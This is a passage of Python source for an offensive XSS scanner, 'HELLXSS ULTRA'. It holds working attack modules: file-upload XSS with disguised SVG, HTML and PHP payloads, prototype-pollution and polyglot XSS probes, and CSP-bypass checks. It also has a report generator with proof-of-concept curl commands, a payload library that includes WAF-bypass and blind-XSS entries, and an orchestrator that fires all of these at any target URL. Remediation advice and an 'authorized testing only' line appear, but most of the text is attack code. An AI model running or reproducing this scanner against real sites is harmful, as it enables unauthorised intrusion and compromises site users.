
    def run(self):
        phase(10, "XSS VIA FILE UPLOAD (SVG/HTML/XML)")
        if not self.intel.upload_forms:
            log("No file upload forms found — skipping")
            return
        log(f"Testing {len(self.intel.upload_forms)} upload forms...")
        for form in self.intel.upload_forms:
            self._test(form)
        ok(f"Upload XSS: {self.found} found")

    def _test(self, form):
        url = form['url']
        for fname, content, ct in [
            ('hellxss.svg',   self.SVG_XSS,   'image/svg+xml'),
            ('hellxss.html',  self.HTML_XSS,  'text/html'),
            ('hellxss.xml',   self.XML_XSS,   'application/xml'),
            ('hellxss.php',   b'<?php echo "<img src=x onerror=alert(1)>"; ?>', 'image/jpeg'),
            ('test.jpg',      b'\xff\xd8\xff\xe0<script>alert(1)</script>', 'image/jpeg'),
        ]:
            try:
                files = {}
                # Find the file input field
                file_field = next((k for k,v in form['fields'].items()
                                   if 'file' in k.lower() or 'upload' in k.lower()
                                   or 'image' in k.lower() or 'photo' in k.lower()), 'file')
                files[file_field] = (fname, content, ct)
                data = {k: v for k,v in form['fields'].items() if k != file_field}
                resp = self.http.session.post(url, files=files, data=data,
                                              headers=dict(self.http.bh),
                                              timeout=self.http.args.timeout,
                                              verify=False)
                if not resp: continue
                # Check if upload succeeded and look for reflected path
                for m in re.finditer(r'(?:src|href)=["\']([^"\']+' + re.escape(fname.split('.')[0]) + r'[^"\']*)["\']',
                                     resp.text, re.I):
                    upload_url = urllib.parse.urljoin(url, m.group(1))
                    up_resp = self.http.get(upload_url)
                    if up_resp and ('HELLXSS' in up_resp.text or b'alert' in up_resp.content):
                        if not self.db.has(url, file_field, 'upload-xss'):
                            self.found += 1
                            self.db.add({
                                'title':     f'XSS via File Upload ({fname})',
                                'type':      'upload-xss',
                                'severity':  'HIGH',
                                'cvss':      '8.0',
                                'url':       url,
                                'parameter': file_field,
                                'method':    'POST-UPLOAD',
                                'payload':   f'Upload: {fname}',
                                'context':   'file-upload',
                                'evidence':  f'{fname} uploaded and accessible at {upload_url}',
                                'poc':       (f"# Upload XSS PoC — HACKEROFHELL\n"
                                              f"# Upload hellxss.svg to {url}\n"
                                              f"curl -F '{file_field}=@hellxss.svg;type=image/svg+xml' '{url}'\n\n"
                                              f"# Then access: {upload_url}\n"
                                              f"# Browser will execute: alert(document.domain)"),
                                'remediation': 'Validate file types by content (magic bytes), not extension. Serve uploads from separate domain. Strip SVG JavaScript.',
                                'timestamp': datetime.utcnow().isoformat()
                            })
                            crit(f"UPLOAD XSS [{fname}] | {url} → {upload_url}")
                            return
            except Exception as e:
                pass

# ══════════════════════════════════════════════════════════════════════
# MODULE 11 — CSP ANALYSIS & BYPASS
# ══════════════════════════════════════════════════════════════════════
class CSPAnalyzer:
    def __init__(self, http, args, db, intel):
        self.http = http; self.args = args
        self.db   = db;   self.intel = intel

    def run(self):
        phase(11, "CSP ANALYSIS & BYPASS")
        resp = self.http.get(self.intel.base)
        if not resp: return
        csp = resp.headers.get('Content-Security-Policy', '')
        if not csp:
            csp_meta = re.search(r'<meta[^>]+http-equiv=["\']Content-Security-Policy["\'][^>]+content=["\']([^"\']+)',
                                 resp.text, re.I)
            if csp_meta: csp = csp_meta.group(1)
        if not csp:
            warn("No CSP detected — XSS has no Content-Security-Policy protection")
            self.db.add({
                'title':     'Missing Content-Security-Policy (CSP)',
                'type':      'csp-missing',
                'severity':  'MEDIUM',
                'cvss':      '5.3',
                'url':       self.intel.base,
                'parameter': 'HTTP header',
                'method':    'HEADER',
                'payload':   'N/A',
                'context':   'csp',
                'evidence':  'No Content-Security-Policy header found. XSS attacks have maximum impact.',
                'poc':       f"curl -sk -I '{self.intel.base}' | grep -i content-security",
                'remediation': "Add: Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'",
                'timestamp': datetime.utcnow().isoformat()
            })
            return

        ok(f"CSP found: {csp[:100]}...")
        issues = []
        # Unsafe inline
        if "'unsafe-inline'" in csp:
            issues.append("'unsafe-inline' allows inline script execution — XSS bypass possible")
        # Unsafe eval
        if "'unsafe-eval'" in csp:
            issues.append("'unsafe-eval' allows eval() — prototype pollution → XSS possible")
        # Wildcard
        if re.search(r'script-src[^;]*\*', csp):
            issues.append("Wildcard (*) in script-src — any external script can be loaded")
        # data: URI
        if 'data:' in csp:
            issues.append("data: URI in CSP — can load XSS via data: URI scheme")
        # JSONP bypass
        for domain in re.findall(r'(?:https?://)?([a-z0-9\-*.]+\.(?:com|net|org|io))', csp):
            if any(x in domain for x in ['googleapis', 'gstatic', 'cloudflare', 'cdnjs',
                                          'jquery', 'bootstrapcdn', 'unpkg', 'jsdelivr']):
                issues.append(f"Allowed CDN {domain} may have JSONP endpoint bypass")
        # No nonce
        if "nonce-" not in csp and "'strict-dynamic'" not in csp:
            issues.append("No nonce/strict-dynamic — hash/nonce bypass attacks possible")
        for issue in issues:
            warn(f"CSP Issue: {issue}")
            self.db.add({
                'title':     f'CSP Misconfiguration',
                'type':      'csp-bypass',
                'severity':  'MEDIUM',
                'cvss':      '5.3',
                'url':       self.intel.base,
                'parameter': 'Content-Security-Policy',
                'method':    'HEADER',
                'payload':   csp[:200],
                'context':   'csp',
                'evidence':  issue,
                'poc':       '\n'.join(XPayloads.CSP_BYPASS[:3]),
                'remediation': "Tighten CSP. Remove unsafe-inline/unsafe-eval. Use nonces. Avoid wildcards.",
                'timestamp': datetime.utcnow().isoformat()
            })

# ══════════════════════════════════════════════════════════════════════
# MODULE 12 — PROTOTYPE POLLUTION → XSS
# ══════════════════════════════════════════════════════════════════════
class ProtoPollutionXSS:
    def __init__(self, http, args, db, intel):
        self.http = http; self.args = args
        self.db   = db;   self.intel = intel
        self.found = 0

    def run(self):
        phase(12, "PROTOTYPE POLLUTION → XSS")
        for url in self.intel.param_urls[:30]:
            self._test(url)
        for pp in XPayloads.PROTO_POLL:
            test_url = self.intel.base + pp
            resp = self.http.get(test_url)
            if resp and re.search(r'innerHTML|src.*=.*http|onerror', resp.text):
                if not self.db.has(self.intel.base, '__proto__', 'proto-xss'):
                    self.found += 1
                    self.db.add({
                        'title':     'Prototype Pollution → XSS',
                        'type':      'proto-xss',
                        'severity':  'HIGH',
                        'cvss':      '7.3',
                        'url':       test_url,
                        'parameter': '__proto__ / constructor.prototype',
                        'method':    'GET',
                        'payload':   pp,
                        'context':   'prototype-pollution',
                        'evidence':  'Prototype pollution accepted — XSS via innerHTML possible',
                        'poc':       (f"# Prototype Pollution → XSS — HACKEROFHELL\n"
                                      f"# Test URL:\ncurl -sk '{test_url}'\n\n"
                                      f"# Escalate to XSS:\n{self.intel.base}?__proto__[innerHTML]=<img+src=x+onerror=alert(1)>\n\n"
                                      f"# In JS console (browser):\nObject.prototype.innerHTML = '<img src=x onerror=alert(1)>'"),
                        'remediation': 'Use Object.create(null). Freeze Object.prototype. Use prototype-pollution-safe merge libraries.',
                        'timestamp': datetime.utcnow().isoformat()
                    })
                    vuln(f"PROTO POLLUTION XSS | {self.intel.base}")
        ok(f"Prototype pollution XSS: {self.found} found")

    def _test(self, url):
        for pp in XPayloads.PROTO_POLL:
            if '?' in url:
                test_url = url + '&' + pp.lstrip('?')
            else:
                test_url = url + pp
            resp = self.http.get(test_url)
            if resp and ('<img src=x' in resp.text or 'onerror=alert' in resp.text):
                if not self.db.has(url, '__proto__', 'proto-xss-param'):
                    self.found += 1
                    self.db.add({
                        'title':     'Prototype Pollution → XSS (URL param)',
                        'type':      'proto-xss-param',
                        'severity':  'HIGH',
                        'cvss':      '7.3',
                        'url':       test_url,
                        'parameter': '__proto__',
                        'method':    'GET',
                        'payload':   pp,
                        'context':   'prototype-pollution',
                        'evidence':  'XSS payload from prototype pollution reflected in DOM',
                        'poc':       f"curl -sk '{test_url}'",
                        'remediation': 'Sanitize __proto__ and constructor.prototype in all input parsing.',
                        'timestamp': datetime.utcnow().isoformat()
                    })
                    vuln(f"PROTO POLLUTION XSS | {url}")
                    return

# ══════════════════════════════════════════════════════════════════════
# MODULE 13 — POLYGLOT & ADVANCED XSS
# ══════════════════════════════════════════════════════════════════════
class PolyglotXSS:
    def __init__(self, http, args, db, intel):
        self.http = http; self.args = args
        self.db   = db;   self.intel = intel
        self.found = 0

    def run(self):
        phase(13, "POLYGLOT XSS + mXSS + DOM CLOBBERING")
        targets = [(url, param) for url in self.intel.param_urls[:20]
                   for param in urllib.parse.parse_qs(urllib.parse.urlparse(url).query)]
        log(f"Polyglot testing {len(targets)} points...")
        all_payloads = XPayloads.POLYGLOT + XPayloads.MXSS + XPayloads.DOM_CLOBBER
        for url, param in targets:
            for payload in all_payloads[:5]:
                if isinstance(payload, bytes): payload = payload.decode('utf-8', errors='replace')
                marker = XPayloads.make_marker()
                parsed = urllib.parse.urlparse(url)
                params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
                params[param] = [payload]
                new_url = urllib.parse.urlunparse(parsed._replace(
                    query=urllib.parse.urlencode(params, doseq=True)))
                resp = self.http.get(new_url)
                if resp and self._is_xss(resp.text, payload):
                    if not self.db.has(url, param, 'polyglot-xss'):
                        self.found += 1
                        self.db.add({
                            'title':     'Polyglot XSS — Multi-Context',
                            'type':      'polyglot-xss',
                            'severity':  'HIGH',
                            'cvss':      '7.4',
                            'url':       url,
                            'parameter': param,
                            'method':    'GET',
                            'payload':   payload[:200],
                            'context':   'polyglot-multiple',
                            'evidence':  'Polyglot payload unescaped — works in multiple contexts',
                            'poc':       f"curl -sk '{new_url}'",
                            'remediation': 'Apply output encoding for ALL contexts. Use CSP. Review template rendering.',
                            'timestamp': datetime.utcnow().isoformat()
                        })
                        vuln(f"POLYGLOT XSS | {url} | {param}")
                        break
        ok(f"Polyglot XSS: {self.found} found")

    def _is_xss(self, text, payload):
        if not payload: return False
        key_parts = [p for p in re.findall(r'<\w+|on\w+=|javascript:|alert', payload, re.I)]
        return sum(1 for p in key_parts if p.lower() in text.lower()) >= 2

# ══════════════════════════════════════════════════════════════════════
# REPORT GENERATOR
# ══════════════════════════════════════════════════════════════════════
class Report:
    def __init__(self, db, args, http):
        self.db   = db
        self.args = args
        self.http = http

    def generate(self):
        phase(20, "REPORT GENERATION")
        findings = self.db.findings
        sev      = self.db.by_severity()
        total    = self.db.count()
        risk     = (sev.get('CRITICAL',0)*10 + sev.get('HIGH',0)*7 +
                    sev.get('MEDIUM',0)*4 + sev.get('INFO',0)*1)
        sev_col  = {'CRITICAL':'#ff2d55','HIGH':'#ff6b35','MEDIUM':'#ffd60a',
                    'LOW':'#30d158','INFO':'#636366'}
        # Build finding cards HTML
        f_html = ""
        for i, f in enumerate(findings):
            sv  = f.get('severity','HIGH')
            col = sev_col.get(sv,'#888')
            poc = f.get('poc','').replace('&','&amp;').replace('<','&lt;').replace('>','&gt;')
            ev  = str(f.get('evidence','')).replace('<','&lt;').replace('>','&gt;')[:500]
            rem = f.get('remediation','').replace('<','&lt;').replace('>','&gt;')
            url = f.get('url','').replace('<','&lt;')
            pld = f.get('payload','').replace('<','&lt;').replace('>','&gt;')[:300]
            f_html += f"""
<div class="f" onclick="tog({i})">
  <div class="fh">
    <div class="fl">
      <span class="sb" style="color:{col};border-color:{col}40;background:{col}15">{sv}</span>
      <span class="cv">CVSS {f.get('cvss','?')}</span>
      <span class="ctx">⚡ {f.get('type','').upper()}</span>
      <span class="ft">{f.get('title','')[:75]}</span>
    </div>
    <div class="fr">
      <span class="ctx2">{f.get('context','')[:20]}</span>
      <span class="arr" id="a{i}">▼</span>
    </div>
  </div>
  <div class="fb" id="b{i}">
    <div class="fg">
      <div>
        <div class="fr2"><div class="fl2">URL / ENDPOINT</div><div class="fv mono">{url}</div></div>
        <div class="fr2"><div class="fl2">PARAMETER</div><div class="fv">{f.get('parameter','-')}</div></div>
        <div class="fr2"><div class="fl2">CONTEXT</div><div class="fv ctx-val">{f.get('context','html')}</div></div>
        <div class="fr2"><div class="fl2">EVIDENCE</div><div class="ev">{ev}</div></div>
        <div class="fr2"><div class="fl2">PAYLOAD USED</div><div class="ev payload-ev">{pld}</div></div>
        <div class="fr2"><div class="fl2">REMEDIATION</div><div class="rm">{rem}</div></div>
      </div>
      <div>
        <div class="fr2"><div class="fl2">PROOF OF CONCEPT</div>
          <pre class="poc">{poc}</pre>
          <button class="cb" onclick="cp({i},event)">⎘ COPY PoC</button>
          <button class="pb" onclick="cpPay({i},event)">📋 COPY PAYLOAD</button>
        </div>
      </div>
    </div>
  </div>
</div>"""
        # Stats bars
        sbars = ""
        for sv, col in sev_col.items():
            cnt = sev.get(sv,0)
            pct = int(cnt/max(total,1)*100) if total else 0
            sbars += f'<div class="sr"><span style="color:{col};width:80px;font-size:.7rem;font-weight:700">{sv}</span><div class="sw"><div class="sf" style="width:{pct}%;background:{col}"></div></div><span style="color:{col};font-size:.7rem;width:24px;text-align:right">{cnt}</span></div>'
        # Types breakdown
        types = {}
        for f in findings: types[f.get('type','')] = types.get(f.get('type',''),0)+1
        types_html = ''.join(f'<span class="type-badge">{t}: {n}</span>' for t,n in types.items())
        # All payloads list
        all_payloads_html = ""
        for cat, plist in [("Basic",XPayloads.BASIC[:10]),
                            ("Event Handlers",XPayloads.EVENT_HANDLERS[:8]),
                            ("WAF Bypass",XPayloads.WAF_BYPASS[:10]),
                            ("Polyglot",XPayloads.POLYGLOT[:3]),
                            ("Blind XSS",XPayloads.BLIND_TEMPLATE[:5])]:
            all_payloads_html += f'<div class="pcat"><div class="pcatname">{cat}</div>'
            for p in plist:
                if isinstance(p, bytes): p = p.decode('utf-8', errors='replace')
                pe = p.replace('&','&amp;').replace('<','&lt;').replace('>','&gt;')
                all_payloads_html += f'<div class="payline"><code>{pe[:120]}</code></div>'
            all_payloads_html += '</div>'
        pocs_js  = json.dumps([f.get('poc','') for f in findings])
        pays_js  = json.dumps([f.get('payload','') for f in findings])
        rpath = self.db.outdir / f"HELLXSS_{self.db.outdir.name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
        html = f"""<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>HELLXSS ULTRA — XSS Report: {self.args.target}</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
:root{{--bg:#030810;--s1:#06101a;--s2:#0a1825;--b1:#102235;--b2:#1a3a5c;
  --t:#c8e6f0;--m:#4a7a9b;--a:#00d4ff;--cr:#ff2d55;--a3:#39ff14;--a4:#bf5af2}}
body{{background:var(--bg);color:var(--t);font-family:'Courier New',monospace;min-height:100vh}}
body::before{{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,212,255,.012) 2px,rgba(0,212,255,.012) 4px);pointer-events:none;z-index:9999}}
.page{{max-width:1350px;margin:0 auto;padding:28px 20px}}
.rh{{background:var(--s1);border:1px solid var(--b2);border-top:3px solid var(--cr);padding:28px;margin-bottom:24px;display:grid;grid-template-columns:1fr auto;gap:20px}}
.ascii{{font-size:.42rem;line-height:1.2;color:var(--cr);white-space:pre}}
.rt{{font-size:1.8rem;font-weight:900;background:linear-gradient(135deg,var(--a),var(--a4),var(--cr));-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin:12px 0 8px}}
.meta{{font-size:.64rem;color:var(--m);line-height:2.2}}.meta span{{color:var(--a3);font-weight:700}}
.risk{{background:var(--bg);border:1px solid var(--b2);padding:20px 28px;text-align:center}}
.rn{{font-size:3.5rem;font-weight:900;color:var(--cr);text-shadow:0 0 30px rgba(255,45,85,.6);line-height:1}}
.rl{{font-size:.55rem;letter-spacing:.25em;color:var(--m);margin-top:5px}}
.sg{{display:grid;grid-template-columns:1fr 1fr 1fr;gap:14px;margin-bottom:24px}}
.sb2{{background:var(--s1);border:1px solid var(--b2);padding:18px 20px}}
.st{{font-size:.58rem;letter-spacing:.25em;color:var(--a);border-bottom:1px solid var(--b2);padding-bottom:8px;margin-bottom:14px}}
.sr{{display:flex;align-items:center;gap:10px;margin-bottom:10px}}
.sw{{flex:1;height:5px;background:var(--b1)}}.sf{{height:100%}}
.cg{{display:grid;grid-template-columns:repeat(3,1fr);gap:8px}}
.ci{{background:var(--bg);border:1px solid var(--b2);padding:12px;text-align:center}}
.cn{{font-size:1.8rem;font-weight:700;color:var(--a)}}.cl{{font-size:.55rem;letter-spacing:.1em;color:var(--m);margin-top:3px}}
.type-badge{{display:inline-block;background:rgba(191,90,242,.1);border:1px solid rgba(191,90,242,.3);color:var(--a4);font-size:.58rem;padding:3px 8px;margin:2px}}
.section-title{{font-size:.62rem;letter-spacing:.25em;color:var(--a);margin-bottom:12px;padding-bottom:8px;border-bottom:1px solid var(--b2)}}
.f{{border:1px solid var(--b2);margin-bottom:5px;background:var(--s1)}}
.fh{{display:flex;justify-content:space-between;align-items:center;padding:12px 18px;cursor:pointer;transition:background .15s}}
.fh:hover{{background:var(--s2)}}
.fl{{display:flex;align-items:center;gap:8px;flex:1;min-width:0}}
.fr{{display:flex;align-items:center;gap:8px;flex-shrink:0}}
.sb{{font-size:.58rem;font-weight:700;padding:3px 10px;border:1px solid;letter-spacing:.1em;flex-shrink:0}}
.cv{{font-size:.6rem;background:var(--bg);border:1px solid var(--b2);padding:3px 8px;color:var(--m);flex-shrink:0}}
.ctx{{font-size:.55rem;color:var(--cr);background:rgba(255,45,85,.1);border:1px solid rgba(255,45,85,.2);padding:2px 6px;flex-shrink:0}}
.ctx2{{font-size:.55rem;color:var(--m);background:var(--bg);border:1px solid var(--b2);padding:2px 6px;flex-shrink:0}}
.ft{{font-size:.88rem;font-weight:700;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}}
.arr{{color:var(--m);font-size:.65rem;transition:transform .2s}}
.fb{{padding:18px;border-top:1px solid var(--b2);background:var(--bg);display:none}}
.fg{{display:grid;grid-template-columns:1fr 1fr;gap:18px}}
.fr2{{margin-bottom:14px}}.fl2{{font-size:.58rem;letter-spacing:.15em;color:var(--m);margin-bottom:6px}}
.fv{{font-size:.82rem;line-height:1.6}}.mono{{font-size:.72rem;color:var(--a);word-break:break-all}}
.ctx-val{{color:var(--a4);font-size:.75rem}}
.ev{{background:var(--s1);border:1px solid var(--b2);border-left:3px solid #ffd60a;padding:10px;font-size:.7rem;color:#7ee787;word-break:break-all;line-height:1.6}}
.payload-ev{{border-left-color:var(--cr);color:#ff9eb5}}
.rm{{color:#79c0ff;font-size:.8rem;line-height:1.7}}
.poc{{background:#010409;border:1px solid var(--b2);border-left:3px solid var(--cr);padding:12px;font-size:.68rem;color:#7ee787;white-space:pre-wrap;overflow-x:auto;line-height:1.8;margin-bottom:6px;max-height:280px;overflow-y:auto}}
.cb,.pb{{background:transparent;border:1px solid var(--b2);color:var(--m);font-family:'Courier New',monospace;font-size:.58rem;padding:4px 10px;cursor:pointer;margin-right:6px;margin-top:4px}}
.cb:hover{{color:var(--a);border-color:var(--a)}}.pb:hover{{color:var(--cr);border-color:var(--cr)}}
/* Payload library */
.payload-lib{{background:var(--s1);border:1px solid var(--b2);padding:20px;margin-top:24px}}
.pcat{{margin-bottom:20px}}
.pcatname{{font-size:.65rem;letter-spacing:.2em;color:var(--a4);margin-bottom:10px;font-weight:700}}
.payline{{background:var(--bg);border:1px solid var(--b1);padding:8px 12px;margin-bottom:4px;font-size:.65rem}}
.payline code{{color:#7ee787;word-break:break-all}}
.footer{{margin-top:40px;padding:20px 28px;background:var(--s1);border:1px solid var(--b2);font-size:.65rem;color:var(--m)}}
.fl-logo{{font-size:.85rem;font-weight:700;color:var(--a);margin-bottom:8px}}
::-webkit-scrollbar{{width:4px}}::-webkit-scrollbar-track{{background:var(--bg)}}::-webkit-scrollbar-thumb{{background:var(--b2)}}
@media(max-width:900px){{.rh,.sg,.fg{{grid-template-columns:1fr}}}}
</style></head><body>
<div class="page">
<div class="rh">
  <div>
    <pre class="ascii">
██╗  ██╗███████╗██╗     ██╗       ██╗  ██╗███████╗███████╗
██║  ██║██╔════╝██║     ██║       ╚██╗██╔╝██╔════╝██╔════╝
███████║█████╗  ██║     ██║        ╚███╔╝ ███████╗███████╗
██╔══██║██╔══╝  ██║     ██║        ██╔██╗ ╚════██║╚════██║
██║  ██║███████╗███████╗███████╗  ██╔╝ ██╗███████║███████║
╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝  ╚═╝  ╚═╝╚══════╝╚══════╝
                  v1.0 ULTRA — XSS AUDIT REPORT</pre>
    <div class="rt">XSS VULNERABILITY AUDIT REPORT</div>
    <div class="meta">
      TARGET: <span>{self.args.target}</span> &nbsp;|&nbsp; DATE: <span>{datetime.now().strftime('%Y-%m-%d %H:%M UTC')}</span><br>
      AUTHOR: <span>RAJESH BAJIYA</span> &nbsp;|&nbsp; HANDLE: <span>HACKEROFHELL</span> &nbsp;|&nbsp; GITHUB: <span>hellrider978</span><br>
      TOOL: <span>HELLXSS v1.0 ULTRA</span> &nbsp;|&nbsp; REQUESTS: <span>{self.http.count}</span> &nbsp;|&nbsp; CLASSIFICATION: <span>CONFIDENTIAL</span>
    </div>
  </div>
  <div class="risk"><div class="rn">{risk}</div><div class="rl">RISK SCORE</div></div>
</div>
<div class="sg">
  <div class="sb2"><div class="st">FINDINGS BY SEVERITY</div>{sbars}</div>
  <div class="sb2"><div class="st">STATISTICS</div>
    <div class="cg">
      <div class="ci"><div class="cn">{total}</div><div class="cl">TOTAL</div></div>
      <div class="ci"><div class="cn" style="color:#ff2d55">{sev.get('CRITICAL',0)}</div><div class="cl">CRITICAL</div></div>
      <div class="ci"><div class="cn" style="color:#ff6b35">{sev.get('HIGH',0)}</div><div class="cl">HIGH</div></div>
      <div class="ci"><div class="cn" style="color:#ffd60a">{sev.get('MEDIUM',0)}</div><div class="cl">MEDIUM</div></div>
      <div class="ci"><div class="cn" style="color:#39ff14">{self.http.count}</div><div class="cl">REQUESTS</div></div>
      <div class="ci"><div class="cn" style="color:#bf5af2">{len(set(f.get('type','') for f in findings))}</div><div class="cl">XSS TYPES</div></div>
    </div>
  </div>
  <div class="sb2"><div class="st">XSS TYPES FOUND</div><div>{types_html}</div></div>
</div>
<div class="section-title">🔥 CONFIRMED XSS VULNERABILITY FINDINGS</div>
{f_html if f_html else '<div style="color:var(--m);padding:40px;text-align:center;border:1px solid var(--b2)">No XSS confirmed. Target appears well-protected.</div>'}
<div class="payload-lib">
  <div class="st">📋 XSS PAYLOAD LIBRARY — All Payloads Tested</div>
  {all_payloads_html}
</div>
<div class="footer">
  <div class="fl-logo">🔥 HELLXSS v1.0 ULTRA — XSS AUDIT REPORT</div>
  <div>Author: RAJESH BAJIYA | Handle: HACKEROFHELL | GitHub: hellrider978</div>
  <div>Target: {self.args.target} | Findings: {total} | Requests: {self.http.count}</div>
  <div style="margin-top:8px;color:var(--b2)">CONFIDENTIAL — Authorized testing only. Generated by HELLXSS ULTRA v1.0</div>
</div>
</div>
<script>
const pocs={pocs_js};
const pays={pays_js};
function tog(i){{const b=document.getElementById('b'+i),a=document.getElementById('a'+i);b.style.display=b.style.display==='block'?'none':'block';a.style.transform=b.style.display==='block'?'rotate(180deg)':''}}
function cp(i,e){{e.stopPropagation();navigator.clipboard.writeText(pocs[i]||'').catch(()=>{{}});const b=e.target;b.textContent='✓ COPIED';setTimeout(()=>b.textContent='⎘ COPY PoC',2000)}}
function cpPay(i,e){{e.stopPropagation();navigator.clipboard.writeText(pays[i]||'').catch(()=>{{}});const b=e.target;b.textContent='✓ PAYLOAD COPIED';setTimeout(()=>b.textContent='📋 COPY PAYLOAD',2000)}}
</script></body></html>"""
        rpath.write_text(html)
        ok(f"HTML Report: {rpath}")
        # Summary
        spath = self.db.outdir / 'summary.txt'
        with open(spath,'w') as sf:
            sf.write(f"HELLXSS v1.0 ULTRA — by RAJESH BAJIYA (HACKEROFHELL)\n")
            sf.write(f"Target: {self.args.target}\n")
            sf.write(f"Date: {datetime.now().isoformat()}\n\n")
            sf.write(f"Total XSS: {total}\n")
            sf.write(f"Critical: {sev.get('CRITICAL',0)}\n")
            sf.write(f"High: {sev.get('HIGH',0)}\n")
            sf.write(f"Requests: {self.http.count}\n\n")
            for f in findings:
                sf.write(f"[{f['severity']}][{f['type']}] {f['title']}\n")
                sf.write(f"  URL: {f['url']}\n  Param: {f['parameter']}\n")
                sf.write(f"  Payload: {f['payload'][:80]}\n\n")
        return str(rpath)

# ══════════════════════════════════════════════════════════════════════
# MAIN
# ══════════════════════════════════════════════════════════════════════
def main():
    parser = build_parser()
    args   = parser.parse_args()
    if not args.target.startswith('http'): args.target = 'https://' + args.target
    if args.ultra: args.crawl=True; args.deep=True; args.level=3; args.waf_bypass=True
    skip_mods = set()
    if args.skip_modules:
        for m in args.skip_modules.split(','):
            try: skip_mods.add(int(m.strip()))
            except: pass

    print(BANNER)
    print(f"  {C.MAG}Target  :{C.NC} {C.BGRN}{C.BOLD}{args.target}{C.NC}")
    print(f"  {C.MAG}Output  :{C.NC} {C.CYN}{args.output}{C.NC}")
    print(f"  {C.MAG}Threads :{C.NC} {C.WHT}{args.threads}{C.NC}")
    print(f"  {C.MAG}Level   :{C.NC} {C.WHT}{args.level}{C.NC}")
    print(f"  {C.MAG}Blind   :{C.NC} {C.WHT}{getattr(args,'blind_url','not set') or 'not set'}{C.NC}")
    if skip_mods: print(f"  {C.MAG}Skipping:{C.NC} {C.YLW}Modules {skip_mods}{C.NC}")
    print()

    http = HTTP(args)
    db   = DB(args.output, args.target)

    def sigint(s, f):
        warn("Interrupted — generating partial report...")
        Report(db, args, http).generate(); sys.exit(0)
    signal.signal(signal.SIGINT, sigint)

    # Module orchestration
    if 1 not in skip_mods:
        intel = Intel(http, args, db); intel.run()
    else:
        skip("Module 01"); intel = Intel(http, args, db)
        intel._process(args.target)
        if getattr(args,'url',None) and '?' in args.url: intel.param_urls.append(args.url)

    if 3 not in skip_mods: ReflectedXSS(http, args, db, intel).run()
    else: skip("Module 03 (Reflected XSS)")

    if 4 not in skip_mods: StoredXSS(http, args, db, intel).run()
    if 5 not in skip_mods: DOMXSS(http, args, db, intel).run()
    if 6 not in skip_mods: BlindXSS(http, args, db, intel).run()
    if 7 not in skip_mods: HeaderXSS(http, args, db, intel).run()
    if 8 not in skip_mods: JSONXSS(http, args, db, intel).run()
    if 9 not in skip_mods: TemplateXSS(http, args, db, intel).run()
    if 10 not in skip_mods: UploadXSS(http, args, db, intel).run()
    if 11 not in skip_mods: CSPAnalyzer(http, args, db, intel).run()
    if 12 not in skip_mods: ProtoPollutionXSS(http, args, db, intel).run()
    if 13 not in skip_mods: PolyglotXSS(http, args, db, intel).run()

    report_path = Report(db, args, http).generate()

    sev = db.by_severity(); total = db.count()
    print(f"\n{C.BRED}{C.BOLD}")
    print("  ╔══════════════════════════════════════════════════════════╗")
    print("  ║         HELLXSS — SCAN COMPLETE                         ║")
    print("  ╚══════════════════════════════════════════════════════════╝")
    print(f"{C.NC}")
    print(f"  {C.MAG}Author   :{C.NC} {C.WHT}RAJESH BAJIYA{C.NC}  |  {C.BRED}{C.BOLD}HACKEROFHELL{C.NC}")
    print(f"  {C.MAG}Target   :{C.NC} {C.BGRN}{args.target}{C.NC}")
    print(f"  {C.BRED}CRITICAL :{C.NC} {C.BOLD}{sev.get('CRITICAL',0)}{C.NC}")
    print(f"  {C.YLW}HIGH     :{C.NC} {C.BOLD}{sev.get('HIGH',0)}{C.NC}")
    print(f"  {C.YLW}MEDIUM   :{C.NC} {sev.get('MEDIUM',0)}")
    print(f"  {C.CYN}TOTAL    :{C.NC} {C.BOLD}{total} XSS confirmed{C.NC}")
    print(f"  {C.CYN}REQUESTS :{C.NC} {http.count}")
    print(f"  {C.BGRN}REPORT   :{C.NC} {C.BOLD}{report_path}{C.NC}")
    print(f"\n  {C.BGRN}firefox {report_path}{C.NC}\n")

    if getattr(args,'webhook',None) and total > 0:
        try:
            requests.post(args.webhook, json={"text":
                f"🔥 [HELLXSS] {args.target} — {total} XSS found! Critical: {sev.get('CRITICAL',0)}"}, timeout=5)
        except: pass

if __name__ == '__main__':
    main()
